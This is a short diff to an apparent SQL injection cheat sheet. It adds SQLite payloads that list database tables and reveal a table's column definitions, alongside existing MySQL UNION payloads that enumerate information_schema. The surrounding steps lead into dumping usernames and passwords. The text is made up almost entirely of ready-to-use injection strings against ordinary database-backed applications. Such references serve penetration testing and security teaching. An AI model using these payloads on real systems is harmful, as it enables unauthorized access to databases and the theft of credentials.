@@ -33,9 +33,17 @@ Automated
 
     ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Users' #
 
+SQLite
+
+    ' UNION SELECT name FROM sqlite_master WHERE type='table'-- -
+
 ### 6) Find the columns name of a table (Table=User)
 
     ' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'User' #
+
+SQLite
+
+    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='User'-- -
 
 ### 7) Dump data (group_concat(username,” | “,password))
 
